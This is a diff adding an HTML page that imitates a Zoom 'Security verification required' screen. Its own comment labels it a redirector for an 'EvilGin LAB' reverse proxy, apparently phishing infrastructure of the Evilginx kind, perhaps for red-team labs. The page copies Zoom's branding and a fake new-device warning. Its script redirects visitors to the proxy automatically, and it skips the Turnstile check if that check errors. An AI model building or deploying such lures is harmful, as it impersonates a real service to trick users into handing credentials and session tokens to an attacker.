@@ -1,0 +1,175 @@
+<!-- Zoom Turnstile Redirector for EvilGin LAB RProxy -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification - Zoom</title>
+    <link rel="icon" href="https://st1.zoom.us/zoom.ico" type="image/x-icon">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: #2d2d2d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #ffffff;
+        }
+        .container {
+            background: #1a1a1a;
+            padding: 48px 40px;
+            border-radius: 8px;
+            border: 1px solid #3d3d3d;
+            text-align: center;
+            max-width: 440px;
+            width: 100%;
+        }
+        .zoom-logo {
+            width: 120px;
+            height: 40px;
+            margin: 0 auto 32px;
+            color: #2d8cff;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #ffffff;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #b3b3b3;
+            margin-bottom: 32px;
+            line-height: 22px;
+        }
+        .security-info {
+            background: #2d2d2d;
+            border-left: 3px solid #2d8cff;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+            border-radius: 4px;
+        }
+        .security-info h2 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #ffffff;
+        }
+        .security-info p {
+            font-size: 14px;
+            color: #b3b3b3;
+            line-height: 20px;
+            margin: 0;
+        }
+        .loading-container {
+            margin: 32px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #3d3d3d;
+            border-top-color: #2d8cff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status-text {
+            font-size: 14px;
+            color: #b3b3b3;
+        }
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #3d3d3d;
+            font-size: 12px;
+            color: #b3b3b3;
+        }
+        .footer a {
+            color: #2d8cff;
+            text-decoration: none;
+        }
+        .footer a:hover { text-decoration: underline; }
+        #cf-turnstile { display: none; }
+        @media (max-width: 480px) {
+            .container { margin: 16px; padding: 32px 24px; }
+            h1 { font-size: 20px; }
+        }
+    </style>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="zoom-logo" style="font-size: 32px; font-weight: bold;">Zoom</div>
+        <h1>Security verification required</h1>
+        <div class="subtitle">To help protect your account, we need to verify that it's really you trying to sign in.</div>
+        <div class="security-info">
+            <h2>Why am I seeing this?</h2>
+            <p>You're signing in from a new location, device, or browser. This extra security step helps keep your account safe.</p>
+        </div>
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-text">Verifying your request...</div>
+        </div>
+        <noscript><p style="color: #ff3333;">JavaScript is required.</p></noscript>
+        <div id="cf-turnstile"></div>
+        <div style="margin-top: 30px;">
+            <a id="manual-redirect-btn" href="#" onclick="performManualRedirect(); return false;" style="display: inline-block; padding: 10px 24px; background: #2d8cff; color: white; text-decoration: none; border-radius: 4px; font-size: 14px;">Continue to Zoom</a>
+        </div>
+        <div class="footer">
+            <a href="https://zoom.us/privacy" target="_blank">Privacy</a> • 
+            <a href="https://zoom.us/terms" target="_blank">Terms</a>
+        </div>
+    </div>
+    <script>
+        const TURNSTILE_SITEKEY = 'YOUR_TURNSTILE_SITE_KEY';
+        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
+        function performRedirect() { window.location.href = REDIRECT_URL; }
+        function performManualRedirect() { if (REDIRECT_URL) window.location.href = REDIRECT_URL; }
+        if (typeof turnstile === 'undefined') {
+            document.querySelector('.status-text').textContent = 'Completing verification...';
+            setTimeout(performRedirect, 2000);
+        } else {
+            turnstile.ready(function () {
+                let verificationTimeout = setTimeout(function() {
+                    document.querySelector('.status-text').textContent = 'Completing verification...';
+                    setTimeout(performRedirect, 500);
+                }, 5000);
+                try {
+                    turnstile.render('#cf-turnstile', {
+                        sitekey: TURNSTILE_SITEKEY,
+                        callback: function(token) {
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                            setTimeout(performRedirect, 800);
+                        },
+                        'error-callback': function(error) {
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
+                            setTimeout(performRedirect, 1000);
+                        }
+                    });
+                } catch (e) {
+                    clearTimeout(verificationTimeout);
+                    setTimeout(performRedirect, 1500);
+                }
+            });
+        }
+        setTimeout(function() {
+            if (REDIRECT_URL) {
+                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                var btn = document.getElementById('manual-redirect-btn');
+                if (btn) btn.href = REDIRECT_URL;
+                try { window.location.href = REDIRECT_URL; } catch (e) { window.location = REDIRECT_URL; }
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
